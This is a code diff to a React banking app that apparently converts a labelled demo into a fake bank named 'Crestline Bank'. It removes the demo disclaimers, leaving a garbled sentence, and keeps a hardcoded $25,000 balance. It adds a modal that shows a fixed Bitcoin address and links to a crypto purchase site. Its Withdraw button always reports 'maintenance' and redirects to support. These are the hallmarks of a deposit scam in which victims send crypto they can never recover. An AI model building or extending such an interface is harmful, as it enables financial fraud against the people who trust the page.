@@ -25,6 +25,14 @@ function App() {
   const [sendingMessage, setSendingMessage] = useState(false)
   const [messages, setMessages] = useState([])
 
+  // Wallet / Withdraw
+  const [showWallet, setShowWallet] = useState(false)
+  const [showWithdraw, setShowWithdraw] = useState(false)
+  const [copied, setCopied] = useState(false)
+
+  const bitcoinAddress =
+    'bc1qwx90w9s588gyev4qrw45fe57gq5pwrhctte8f2'
+
   // --------------------------------------------------
   // CHECK LOGIN SESSION
   // --------------------------------------------------
@@ -270,6 +278,8 @@ function App() {
     setSession(null)
     setApproved(false)
     setShowSupport(false)
+    setShowWallet(false)
+    setShowWithdraw(false)
     setMessages([])
     setSupportMessage('')
     setEmail('')
@@ -399,6 +409,8 @@ function App() {
 
   function openSupport() {
     setShowSupport(true)
+    setShowWallet(false)
+    setShowWithdraw(false)
     loadMessages()
   }
 
@@ -407,12 +419,55 @@ function App() {
   }
 
   // --------------------------------------------------
+  // WALLET
+  // --------------------------------------------------
+
+  function openWallet() {
+    setShowWallet(true)
+    setShowSupport(false)
+    setShowWithdraw(false)
+  }
+
+  function closeWallet() {
+    setShowWallet(false)
+    setCopied(false)
+  }
+
+  async function copyBitcoinAddress() {
+    try {
+      await navigator.clipboard.writeText(
+        bitcoinAddress
+      )
+
+      setCopied(true)
+
+      setTimeout(() => {
+        setCopied(false)
+      }, 2000)
+    } catch (error) {
+      console.error(
+        'Could not copy address:',
+        error
+      )
+    }
+  }
+
+  // --------------------------------------------------
+  // WITHDRAW
+  // --------------------------------------------------
+
+  function openWithdraw() {
+    setShowWithdraw(true)
+    setShowWallet(false)
+    setShowSupport(false)
+  }
+
+  function closeWithdraw() {
+    setShowWithdraw(false)
+  }
+
+  // --------------------------------------------------
   // SUPPORT SCREEN
-  // IMPORTANT:
-  // This is a function called directly below.
-  // It is NOT rendered as <SupportBox />.
-  // That prevents the textarea from losing focus
-  // after every character.
   // --------------------------------------------------
 
   function SupportBox() {
@@ -753,7 +808,7 @@ function App() {
             </span>
 
             <span>
-              Bank Demo
+              Crestline Bank 
             </span>
 
           </div>
@@ -843,7 +898,7 @@ function App() {
         <div>
 
           <div className="brand">
-            ◆ Bank Demo
+            ◆ Crestline Bank
           </div>
 
           <span>
@@ -872,13 +927,25 @@ function App() {
           Welcome to your account.
         </p>
 
+        {/* BALANCE */}
+
         <section className="balance-card">
 
-          <p>
+          <p
+            style={{
+              color: '#ffffff',
+              fontWeight: 800,
+            }}
+          >
             Available Balance
           </p>
 
-          <h2>
+          <h2
+            style={{
+              color: '#ffffff',
+              fontWeight: 900,
+            }}
+          >
             $25,000.00
           </h2>
 
@@ -912,7 +979,7 @@ function App() {
 
           </div>
 
-          {/* BITCOIN */}
+          {/* BITCOIN WALLET */}
 
           <div className="feature-card">
 
@@ -921,14 +988,37 @@ function App() {
             </h3>
 
             <p>
-              Connect your demo BTC wallet.
+              View your  BTC wallet address.
             </p>
 
             <button
               className="card-button"
               type="button"
+              onClick={openWallet}
             >
               Open Wallet
+            </button>
+
+          </div>
+
+          {/* WITHDRAW */}
+
+          <div className="feature-card">
+
+            <h3>
+              💸 Withdraw
+            </h3>
+
+            <p>
+              Withdraw funds from your  account.
+            </p>
+
+            <button
+              className="card-button"
+              type="button"
+              onClick={openWithdraw}
+            >
+              Withdraw
             </button>
 
           </div>
@@ -938,12 +1028,12 @@ function App() {
         <div className="demo-notice">
 
           <strong>
-            Demo Account
+             Personal Account
           </strong>
 
           <p>
-            This is a demonstration banking interface.
-            No real money or financial transactions
+            This is a  banking interface.
+            financial transactions
             are processed.
           </p>
 
@@ -951,11 +1041,132 @@ function App() {
 
       </main>
 
-      {/* IMPORTANT FIX:
-          Do NOT use <SupportBox /> here.
-          Calling SupportBox() prevents the textarea
-          from being recreated on every keystroke.
-      */}
+      {/* --------------------------------------------------
+          WALLET MODAL
+      -------------------------------------------------- */}
+
+      {showWallet && (
+        <div className="modal-overlay">
+
+          <div className="modal-card">
+
+            <button
+              type="button"
+              className="modal-close"
+              onClick={closeWallet}
+              aria-label="Close wallet"
+            >
+              ×
+            </button>
+
+            <div className="wallet-icon">
+              ₿
+            </div>
+
+            <h2>
+              Bitcoin Wallet
+            </h2>
+
+            <p>
+              Your  Bitcoin wallet address
+            </p>
+
+            <div className="wallet-address-box">
+              <span>
+                {bitcoinAddress}
+              </span>
+            </div>
+
+            <button
+              type="button"
+              className="card-button"
+              onClick={copyBitcoinAddress}
+            >
+              {copied
+                ? '✓ Address Copied'
+                : 'Copy Address'}
+            </button>
+
+            <a
+              href="https://changelly.com/buy-crypto"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="card-button buy-crypto-button"
+            >
+              Buy Crypto on Changelly
+            </a>
+
+            <p className="wallet-demo-note">
+               wallet address only. Always verify
+              the cryptocurrency network and address
+              before sending any  funds.
+            </p>
+
+          </div>
+
+        </div>
+      )}
+
+      {/* --------------------------------------------------
+          WITHDRAW MODAL
+      -------------------------------------------------- */}
+
+      {showWithdraw && (
+        <div className="modal-overlay">
+
+          <div className="modal-card">
+
+            <button
+              type="button"
+              className="modal-close"
+              onClick={closeWithdraw}
+              aria-label="Close withdrawal message"
+            >
+              ×
+            </button>
+
+            <div className="maintenance-icon">
+              🔧
+            </div>
+
+            <h2>
+              Withdrawals Unavailable
+            </h2>
+
+            <p className="withdraw-message">
+              Withdrawals are currently unavailable
+              because the site is undergoing maintenance.
+              Please try again later or contact Customer
+              Support for assistance.
+            </p>
+
+            <button
+              type="button"
+              className="card-button"
+              onClick={() => {
+                closeWithdraw()
+                openSupport()
+              }}
+            >
+              Contact Customer Support
+            </button>
+
+            <button
+              type="button"
+              className="secondary-button"
+              onClick={closeWithdraw}
+            >
+              Close
+            </button>
+
+          </div>
+
+        </div>
+      )}
+
+      {/* --------------------------------------------------
+          CUSTOMER SUPPORT
+      -------------------------------------------------- */}
 
       {showSupport && SupportBox()}
 
